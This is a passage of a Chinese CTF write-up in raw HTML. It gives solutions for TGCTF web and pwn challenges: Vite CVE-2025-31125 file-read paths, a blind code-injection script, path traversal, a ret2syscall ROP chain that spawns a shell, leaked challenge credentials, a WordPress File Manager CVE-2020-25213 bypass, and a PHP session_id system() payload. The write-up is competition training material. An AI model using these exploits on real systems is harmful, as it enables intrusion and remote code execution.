SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">11</span></span>\n\nwow=cat /f*</code></pre>\n\n<h3 id=\"前端GAME\"><a href=\"#前端GAME\" class=\"headerlink\" title=\"前端GAME\"></a>前端GAME</h3><p>紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。</p>\n<p>这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&amp;raw??即可</p>\n<pre class=\"language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;node1.tgctf.woooo.tech:32360&#x2F;@fs&#x2F;tgflagggg?import&amp;raw??</code></pre>\n\n<h3 id=\"前端GAME-plus\"><a href=\"#前端GAME-plus\" class=\"headerlink\" title=\"前端GAME plus\"></a>前端GAME plus</h3><p>参考<a href=\"https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC\">https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC</a></p>\n<pre class=\"language-none\"><code class=\"language-none\">&#x2F;@fs&#x2F;tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></pre>\n\n<h3 id=\"火眼辩魑魅\"><a href=\"#火眼辩魑魅\" class=\"headerlink\" title=\"火眼辩魑魅\"></a>火眼辩魑魅</h3><p>robots.txt 直接打 tgshell.php</p>\n<p>无过滤，直接POST传cat &#x2F;f*一把梭了</p>\n<h3 id=\"熟悉的配方，熟悉的味道\"><a href=\"#熟悉的配方，熟悉的味道\" class=\"headerlink\" title=\"熟悉的配方，熟悉的味道\"></a>熟悉的配方，熟悉的味道</h3><p>狠狠非预期！！！</p>\n<p>直接打盲注好吧。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://node1.tgctf.woooo.tech:30215\"</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">\"TGCTF&#123;028b2d11-2783-464c-8cea-fda040\"</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># for s in 'TGCTF&#123;':</span>\n    <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span><span class=\"token operator\">+</span><span class=\"token string\">'&#123;'</span><span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>ascii_lowercase<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"expr\"</span><span class=\"token punctuation\">:</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'));1/a\"</span></span><span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\"># res = requests.post(url, data=json)</span>\n        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(res.text, s)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>text <span class=\"token operator\">!=</span> <span class=\"token string\">\"A server error occurred.  Please contact the administrator.\"</span><span class=\"token punctuation\">:</span>\n            flag <span class=\"token operator\">+=</span> s\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></code></pre>\n\n<p>只要flag逐位是对的上的就会触发1&#x2F;0进而报错。否则就是1&#x2F;1正常。布尔盲注打完了。</p>\n<h3 id=\"直面天命\"><a href=\"#直面天命\" class=\"headerlink\" title=\"直面天命\"></a>直面天命</h3><p>&#x2F;hints发现有路由。爆破。打到&#x2F;aazz。可以传参。那就arjun扫。发现filename参数。</p>\n<p>路径穿越出。</p>\n<p><a href=\"http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag\">http://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag</a></p>\n<h3 id=\"TG-wordpress\"><a href=\"#TG-wordpress\" class=\"headerlink\" title=\"TG_wordpress\"></a>TG_wordpress</h3><p>&#x2F;robots.txt进去。看到&#x2F;.tmp&#x2F;vuln和&#x2F;.tmp&#x2F;.bak。.bak发现服务器在52013开了vuln服务（nc可以连）</p>\n<p>ret2syscall 直接ROPgadgets可以一把梭。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./gets\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#io=remote()</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\np <span class=\"token operator\">=</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">40</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000419484</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rax ; ret</span>\np <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin//sh'</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000044a5e5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov qword ptr [rsi], rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000043d350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor rax, rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000044a5e5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov qword ptr [rsi], rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000401f2f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rdi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000409f9e</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rsi ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000047f2eb</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop rdx ; pop rbx ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x00000000004c50e8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4141414141414141</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># padding</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x000000000043d350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor rax, rax ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000401ce4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># syscall</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>打到账密。TG_wordpressor, aXx^oV@K&amp;cFoVatzQ*</p>\n<p>进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。</p>\n<p>配置文件有过滤。可以使用如下绕过：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'sys'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'tem'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cat /f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>打进去就有了。</p>\n<h3 id=\"AAA偷渡阴平（复仇）\"><a href=\"#AAA偷渡阴平（复仇）\" class=\"headerlink\" title=\"AAA偷渡阴平（复仇）\"></a>AAA偷渡阴平（复仇）</h3><p>没有禁止session相关。</p>\n<p>payload:</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?tgctf2025=session_id();session_start();system(hex2bin(session_id()));</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node2.tgctf.woooo.tech:32385</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">PHPSESSID=636174202f662a</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></code></pre>\n\n<h3 id=\"什么文件上传？（复仇）\"><a href=\"#什么文件上传？（复仇）\" class=\"headerlink\" title=\"什么文件上传？（复仇）\"></a>什么文件上传？（复仇）</h3><p>file_exists可以出发phar。易得：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token 